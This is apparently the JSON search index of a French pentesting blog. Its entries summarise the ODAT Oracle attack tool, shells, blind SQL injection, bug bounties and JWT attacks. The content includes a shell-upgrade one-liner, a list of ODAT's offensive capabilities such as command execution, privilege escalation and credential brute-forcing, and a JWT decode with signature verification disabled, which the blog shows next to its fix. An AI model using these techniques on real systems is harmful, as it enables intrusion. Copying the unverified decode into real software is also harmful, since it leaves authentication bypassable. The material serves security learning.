par dictionnaire sur les sessions le CVE-2012-???? : Un utilisateur authentifié peut modifier toutes les tables qu\u0026rsquo;il peut sélectionner même s\u0026rsquo;il ne peut pas les modifier normalement (pas de privilège ALTER). l\u0026rsquo; attaque CVE-2012-1675 (alias attaque par empoisonnement TNS) rechercher dans les noms de colonnes grâce au module de recherche : rechercher un modèle (ex : mot de passe) dans les noms de colonnes déballer le code source PL/SQL (10g/11g et 12c) Obtenir les privilèges et les rôles système accordés . Il est également possible d\u0026rsquo;obtenir les privilèges et les rôles des rôles accordés. exécuter des requêtes SELECT arbitraires (alias shell SQL minimal) documentation : https://github.com/quentinhardy/odat/wiki\nhttps://www.kali.org/tools/odat/\n","permalink":"https://nyobemichel.me/posts/outils/odat/","summary":"\u003cp\u003eun outil de test de pénétration open source qui teste la sécurité des bases de données Oracle à distance.\nGrâce à ODAT, vous pouvez :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erechercher \u003cstrong\u003eun SID valide\u003c/strong\u003e sur un écouteur de base de données Oracle distant via :\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003eune attaque par force brute\u003c/li\u003e\n\u003cli\u003eALIAS de l\u0026rsquo;auditeur\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher des comptes\u003c/strong\u003e Oracle en utilisant :\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003echaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eexécuter des commandes système\u003c/strong\u003e sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eDBMS_SCHEDULER\u003c/li\u003e\n\u003cli\u003eJAVA\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eoradbg\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003etélécharger les fichiers\u003c/strong\u003e stockés sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eCTXSYS\u003c/li\u003e\n\u003cli\u003eDBMS_LOB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003etélécharger des fichiers\u003c/strong\u003e sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003eDBMS_ADVISOR\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003esupprimer des fichiers\u003c/strong\u003e en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eobtenez un accès privilégié\u003c/strong\u003e en utilisant les combinaisons de privilèges système suivantes (voir l\u0026rsquo;aide pour les commandes du module \u003cem\u003eprivesc\u003c/em\u003e ) :\n\u003cul\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE\u003c/li\u003e\n\u003cli\u003eCRÉER UNE PROCÉDURE et EXÉCUTER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE\u003c/li\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUEL DÉCLENCHEUR (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003cli\u003eANALYSER TOUT (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUEL INDEX (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eenvoyer/recevoir des requêtes HTTP\u003c/strong\u003e depuis le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003escanner les ports\u003c/strong\u003e du serveur local ou d\u0026rsquo;un serveur distant en utilisant :\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003cli\u003eUTL_TCP\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ecapturer une authentification SMB\u003c/strong\u003e via :\n\u003cul\u003e\n\u003cli\u003eun index afin de déclencher une connexion SMB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eexploiter certains CVE :\n\u003cul\u003e\n\u003cli\u003ela \u003ca href=\"http://cvedetails.com/cve/2012-3137\"\u003e\u003cstrong\u003eCVE-2012-3137\u003c/strong\u003e\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003erécupérer la clé de session et le sel pour des utilisateurs arbitraires\u003c/li\u003e\n\u003cli\u003eattaque par dictionnaire sur les sessions\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ele \u003ca href=\"https://twitter.com/gokhanatil/status/595853921479991297\"\u003e\u003cstrong\u003eCVE-2012-????\u003c/strong\u003e\u003c/a\u003e : Un utilisateur authentifié peut modifier toutes les tables qu\u0026rsquo;il peut sélectionner même s\u0026rsquo;il ne peut pas les modifier normalement (pas de privilège ALTER).\u003c/li\u003e\n\u003cli\u003el\u0026rsquo; attaque \u003ca href=\"http://seclists.org/fulldisclosure/2012/Apr/204\"\u003e\u003cstrong\u003eCVE-2012-1675\u003c/strong\u003e\u003c/a\u003e (alias attaque par empoisonnement TNS)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher dans les noms de colonnes\u003c/strong\u003e grâce au module \u003cem\u003ede recherche\u003c/em\u003e :\n\u003cul\u003e\n\u003cli\u003erechercher un modèle (ex : mot de passe) dans les noms de colonnes\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003edéballer\u003c/strong\u003e le code source PL/SQL (10g/11g et 12c)\u003c/li\u003e\n\u003cli\u003eObtenir les privilèges et les rôles \u003cstrong\u003esystème\u003c/strong\u003e \u003cstrong\u003eaccordés\u003c/strong\u003e . Il est également possible d\u0026rsquo;obtenir les privilèges et les rôles des rôles accordés.\u003c/li\u003e\n\u003cli\u003eexécuter des requêtes SELECT arbitraires (alias shell SQL minimal)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003edocumentation : \u003ca href=\"https://github.com/quentinhardy/odat/wiki\"\u003ehttps://github.com/quentinhardy/odat/wiki\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Génération de Shell interactifs Qu\u0026rsquo;est-ce qu\u0026rsquo;un Web Shell ? ","permalink":"https://nyobemichel.me/posts/penetrationtesting/shells--payloads/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell-session\" data-lang=\"shell-session\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"go\"\u003epython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"génération-de-shell-interactifs\"\u003eGénération de Shell interactifs\u003c/h1\u003e\n\u003ch2 id=\"quest-ce-quun-web-shell-\"\u003eQu\u0026rsquo;est-ce qu\u0026rsquo;un Web Shell ?\u003c/h2\u003e","title":""},{"content":"L\u0026rsquo;injection SQL aveugle se produit lorsqu\u0026rsquo;une application est vulnérable à l\u0026rsquo;injection SQL, mais ses réponses HTTP ne contiennent pas les résultats de la requête SQL pertinente ni les détails des erreurs de base de données.\n","permalink":"https://nyobemichel.me/posts/web/blind-sql-injection/","summary":"\u003cp\u003eL\u0026rsquo;injection SQL aveugle se produit lorsqu\u0026rsquo;une application est vulnérable à l\u0026rsquo;injection SQL, mais ses réponses HTTP ne contiennent pas les résultats de la requête SQL pertinente ni les détails des erreurs de base de données.\u003c/p\u003e","title":""},{"content":"Définition et concept de base Un programme de prime aux bugs est un programme proposé par les organisations pour inciter les hackers éthiques à identifier et à divulguer de manière responsable les vulnérabilités de leurs actifs numériques. Au lieu d\u0026rsquo;attendre que des acteurs malveillants exploitent des failles inconnues, les entreprises paient des chercheurs externes pour les signaler en premier.\n","permalink":"https://nyobemichel.me/posts/web/bug-bounty/","summary":"\u003ch3 id=\"définition-et-concept-de-base\"\u003e\u003cstrong\u003eDéfinition et concept de base\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eUn programme de prime aux bugs est un programme proposé par les organisations pour inciter les hackers éthiques à identifier et à divulguer de manière responsable les vulnérabilités de leurs actifs numériques. Au lieu d\u0026rsquo;attendre que des acteurs malveillants exploitent des failles inconnues, les entreprises paient des chercheurs externes pour les signaler en premier.\u003c/p\u003e","title":""},{"content":"JWT ( json web token )\n![[Pasted image 20250707104217.png]]\nLes JWT étant principalement utilisés dans les mécanismes d\u0026rsquo;authentification, de gestion de session et de contrôle d\u0026rsquo;accès\nLa spécification JWT est étendue par les spécifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui définissent des méthodes concrètes d\u0026rsquo;implémentation des JWT. L\u0026rsquo;un des types de jetons les plus courants est le jeton Web JSON (JWT), qui est transmis via l\u0026rsquo; Authorization: Beareren-tête. Les JWT sont des jetons autonomes permettant de transmettre des informations de session de manière sécurisée.\nVous trouverez ci-dessous les deux requêtes cURL permettant d\u0026rsquo;interagir avec l\u0026rsquo; API . Pour l\u0026rsquo;authentification, la requête cURL suivante peut être effectuée :\ncurl -H \u0026#39;Content-Type: application/json\u0026#39; -X POST -d \u0026#39;{ \u0026#34;username\u0026#34; : \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;passwordX\u0026#34; }\u0026#39; http://MACHINE_IP/api/v1.0/exampleX curl -H \u0026#39;Authorization: Bearer [JWT token]\u0026#39; http://MACHINE_IP/api/v1.0/example2?username=Y Structure de JWT Un JWT se compose de trois composants, chacun codé en Base64Url et séparé par des points : Header - L\u0026rsquo;en-tête indique généralement le type de jeton, qui est JWT, ainsi que l\u0026rsquo;algorithme de signature utilisé. Payload la charge utile est le corps du jeton, qui contient les revendications. Une revendication est une information fournie pour une entité spécifique. Signature la signature est la partie du jeton qui fournit une méthode pour vérifier son authenticité.\nAlgorithmes de signature Aucun signature symetrique : HS256, signature asymetrique : RS256\nNe pas vérifier la signature Le premier problème avec la validation de signature survient en l\u0026rsquo;absence de validation. Si le serveur ne vérifie pas la signature du JWT, il est possible de modifier les revendications du JWT selon vos préférences.\npayload = jwt.decode(token, options={\u0026#39;verify_signature\u0026#39;: False}) La solution\nLe JWT doit toujours être vérifié ou des facteurs d\u0026rsquo;authentification supplémentaires, tels que des certificats, doivent être utilisés pour les communications de serveur à serveur. Le JWT peut être vérifié en fournissant la clé secrète (ou publique), comme illustré dans l\u0026rsquo;exemple ci-dessous :\nPayload = jwt.decode(token, self.secret, algorithms=\u0026#34;HS256\u0026#34;) Travailler avec des JWT dans Burp Suite Vous pouvez utiliser Burp Inspector pour visualiser et décoder les JWT. Vous pouvez ensuite utiliser l\u0026rsquo;extension JWT Editor pour :\nGénérer des clés de signature cryptographiques. Modifiez le JWT. Résignez le jeton avec une signature valide qui correspond au JWT modifié. https://jwt.io/ https://datatracker.ietf.org/doc/html/rfc7519 https://gchq.github.io/CyberChef/ https://docs.github.com/fr/enterprise-cloud@latest/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts\n","permalink":"https://nyobemichel.me/posts/web/jwt-attacks/","summary":"\u003cp\u003eJWT ( json web token )\u003c/p\u003e\n\u003cp\u003e![[Pasted image 20250707104217.png]]\u003c/p\u003e\n\u003cp\u003eLes JWT étant principalement utilisés dans les mécanismes d\u0026rsquo;authentification, de gestion de session et de contrôle d\u0026rsquo;accès\u003c/p\u003e\n\u003cp\u003eLa spécification JWT est étendue par les spécifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui définissent des méthodes concrètes d\u0026rsquo;implémentation des JWT.\nL\u0026rsquo;un des types de jetons les plus courants est le jeton Web JSON (JWT), qui est transmis via l\u0026rsquo; \u003ccode\u003eAuthorization: Bearer\u003c/code\u003een-tête.\nLes JWT sont des jetons autonomes permettant de transmettre des informations de session de manière sécurisée.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/web/sql-attack/","summary":"","title":""}]